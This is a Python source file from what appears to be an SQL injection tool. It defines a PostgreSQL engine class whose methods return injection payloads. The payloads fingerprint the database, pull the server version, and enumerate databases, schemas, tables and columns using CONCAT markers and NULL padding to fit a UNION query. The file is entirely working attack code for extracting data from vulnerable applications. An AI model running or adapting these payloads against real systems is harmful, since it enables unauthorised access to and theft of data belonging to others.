from src.engines.sql_injection_engine import SQLInjectionEngine


class SQLInjectionEnginePostgreSQL(SQLInjectionEngine):
    def __init__(self) -> None:
        super().__init__()

    def database_names(self) -> str:
        return "SELECT datname FROM pg_catalog.pg_database"

    def version(self):
        return f"SELECT CONCAT('{SQLInjectionEngine.injection_prefix}', 'version:',version(), '{SQLInjectionEngine.injection_suffix}')"

    def schema(self, columns) -> str:
        return f"SELECT CONCAT('{SQLInjectionEngine.injection_prefix}', 'schema:', schema_name, '{SQLInjectionEngine.injection_suffix}'){', NULL' * (columns - 2)} FROM information_schema.schemata"

    def tables(self, columns) -> str:
        return f"SELECT CONCAT('{SQLInjectionEngine.injection_prefix}', 'table:', table_name, '{SQLInjectionEngine.injection_suffix}'){', NULL' * (columns - 2)} FROM information_schema.tables"

    def column_names(self, table_name):
        if table_name is None:
            raise AssertionError("Table name cannot be null")
        return f"SELECT * FROM information_schema.columns WHERE table_name = '{table_name}'"

    @staticmethod
    def identify() -> str:
        return "EXISTS(SELECT datname FROM pg_database)"
